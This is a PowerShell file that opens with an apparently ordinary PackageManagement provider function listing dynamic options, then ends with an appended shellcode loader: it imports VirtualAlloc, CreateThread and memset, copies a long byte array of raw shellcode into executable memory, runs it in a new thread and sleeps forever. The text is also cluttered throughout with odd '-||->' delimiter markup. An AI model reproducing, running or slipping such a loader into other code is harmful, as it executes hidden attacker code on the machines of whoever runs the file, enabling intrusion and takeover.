 -||-> function Get-DynamicOptions
{
    param
    (
        [Microsoft.PackageManagement.MetaProvider.PowerShell.OptionCategory]
        $category
    )

     -||-> Write-Debug ( -||-> $LocalizedData.ProviderApiDebugMessage -f ( -||-> 'Get-DynamicOptions' <-||- ) <-||- ) <-||- 

     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name $script:PackageManagementProviderParam -ExpectedType String -IsRequired $false <-||- ) <-||- 

    switch( -||-> $category <-||- )
    {
        Package {
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category `
                                                                 -Name $script:PSArtifactType `
                                                                 -ExpectedType String `
                                                                 -IsRequired $false `
                                                                 -PermittedValues @( -||-> $script:PSArtifactTypeModule,$script:PSArtifactTypeScript, $script:All <-||- ) <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name $script:Filter -ExpectedType String -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name $script:Tag -ExpectedType StringArray -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name Includes -ExpectedType StringArray -IsRequired $false -PermittedValues $script:IncludeValidSet <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name DscResource -ExpectedType StringArray -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name RoleCapability -ExpectedType StringArray -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name 'AllowPrereleaseVersions' -ExpectedType Switch -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name Command -ExpectedType StringArray -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name 'AcceptLicense' -ExpectedType Switch -IsRequired $false <-||- ) <-||- 
                }

        Source  {
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name $script:PublishLocation -ExpectedType String -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name $script:ScriptSourceLocation -ExpectedType String -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name $script:ScriptPublishLocation -ExpectedType String -IsRequired $false <-||- ) <-||- 
                }

        Install
                {
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category `
                                                                 -Name $script:PSArtifactType `
                                                                 -ExpectedType String `
                                                                 -IsRequired $false `
                                                                 -PermittedValues @( -||-> $script:PSArtifactTypeModule,$script:PSArtifactTypeScript, $script:All <-||- ) <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name "Scope" -ExpectedType String -IsRequired $false -PermittedValues @( -||-> "CurrentUser","AllUsers" <-||- ) <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name 'AllowClobber' -ExpectedType Switch -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name 'SkipPublisherCheck' -ExpectedType Switch -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name "InstallUpdate" -ExpectedType Switch -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name 'NoPathUpdate' -ExpectedType Switch -IsRequired $false <-||- ) <-||- 
                     -||-> Write-Output -InputObject ( -||-> New-DynamicOption -Category $category -Name 'AllowPrereleaseVersions' -ExpectedType Switch -IsRequired $false <-||- ) <-||- 
                }
    }
} <-||- 
 -||-> $MtB = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $MtB -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xc7,0xbb,0xc4,0x2b,0xf5,0xbd,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x4e,0x83,0xed,0xfc,0x31,0x5d,0x13,0x03,0x99,0x38,0x17,0x48,0xdd,0xd7,0x55,0xb3,0x1d,0x28,0x3a,0x3d,0xf8,0x19,0x7a,0x59,0x89,0x0a,0x4a,0x29,0xdf,0xa6,0x21,0x7f,0xcb,0x3d,0x47,0xa8,0xfc,0xf6,0xe2,0x8e,0x33,0x06,0x5e,0xf2,0x52,0x84,0x9d,0x27,0xb4,0xb5,0x6d,0x3a,0xb5,0xf2,0x90,0xb7,0xe7,0xab,0xdf,0x6a,0x17,0xdf,0xaa,0xb6,0x9c,0x93,0x3b,0xbf,0x41,0x63,0x3d,0xee,0xd4,0xff,0x64,0x30,0xd7,0x2c,0x1d,0x79,0xcf,0x31,0x18,0x33,0x64,0x81,0xd6,0xc2,0xac,0xdb,0x17,0x68,0x91,0xd3,0xe5,0x70,0xd6,0xd4,0x15,0x07,0x2e,0x27,0xab,0x10,0xf5,0x55,0x77,0x94,0xed,0xfe,0xfc,0x0e,0xc9,0xff,0xd1,0xc9,0x9a,0x0c,0x9d,0x9e,0xc4,0x10,0x20,0x72,0x7f,0x2c,0xa9,0x75,0xaf,0xa4,0xe9,0x51,0x6b,0xec,0xaa,0xf8,0x2a,0x48,0x1c,0x04,0x2c,0x33,0xc1,0xa0,0x27,0xde,0x16,0xd9,0x6a,0xb7,0xdb,0xd0,0x94,0x47,0x74,0x62,0xe7,0x75,0xdb,0xd8,0x6f,0x36,0x94,0xc6,0x68,0x39,0x8f,0xbf,0xe6,0xc4,0x30,0xc0,0x2f,0x03,0x64,0x90,0x47,0xa2,0x05,0x7b,0x97,0x4b,0xd0,0x2c,0xc7,0xe3,0x8b,0x8c,0xb7,0x43,0x7c,0x65,0xdd,0x4b,0xa3,0x95,0xde,0x81,0xcc,0xbe,0x30,0x2a,0xf3,0x3e,0x5d,0x59,0x95,0x0f,0xaf,0xb3,0x31,0x1f,0xa2,0xae,0xb1,0xbc,0x12,0x58,0x46,0x43,0x02,0x33,0x8e,0x77,0x52,0xbc,0x1a,0xfc,0x12,0x5f,0xcf,0x06,0xc2,0x37,0x0d,0x09,0xf3,0x9b,0x98,0xef,0x99,0x33,0xcd,0xb8,0x35,0xad,0x54,0x32,0xa4,0x32,0x43,0x3e,0xe6,0xb9,0x60,0xbe,0xa8,0x49,0x0c,0xac,0x5c,0xba,0x5b,0x8e,0xca,0xc5,0x71,0xa5,0xf2,0x53,0x7e,0x6c,0xa5,0xcb,0x7c,0x49,0x81,0x53,0x7e,0xbc,0x9a,0x5a,0xea,0x7f,0xf4,0xa2,0xfa,0x7f,0x04,0xf5,0x90,0x7f,0x6c,0xa1,0xc0,0xd3,0x89,0xae,0xdc,0x47,0x02,0x3b,0xdf,0x31,0xf7,0xec,0xb7,0xbf,0x2e,0xda,0x17,0x3f,0x05,0xda,0x64,0x96,0x63,0xa8,0x84,0x2a <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Wik=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Wik.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Wik,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



